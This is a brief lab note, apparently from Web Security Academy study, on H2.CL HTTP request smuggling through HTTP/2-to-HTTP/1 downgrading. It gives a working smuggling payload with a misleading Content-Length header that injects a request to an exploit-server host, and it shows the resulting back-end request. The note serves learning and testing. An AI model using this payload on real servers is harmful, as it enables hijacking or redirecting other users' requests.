## H2.CL vulnerabilities

HTTP/2 requests don't have to specify their length, during downgrading it's the front-end that performs the math and add the `Content-length` header.
However, HTTP/2 requests can also include their own `content-length` header. In this case, some front-end servers will simply reuse this value in the resulting HTTP/1 request. As a result, it may be possible to smuggle requests by injecting a misleading `content-length` header.

Front-end (HTTP/2):
```http
:method POST
:path /
:authority 0a1e004403689f4581e889fb006f00fd.web-security-academy.net
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
GET /exploit HTTP/1.1
Host: exploit-0a9400a603069f7381e188f501980089.exploit-server.net
Content-Length: 12

search=foo
```

Back-end (HTTP/1):
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /exploit HTTP/1.1
Host: exploit-0a9400a603069f7381e188f501980089.exploit-server.net
Content-Length: 12

search=foo
```
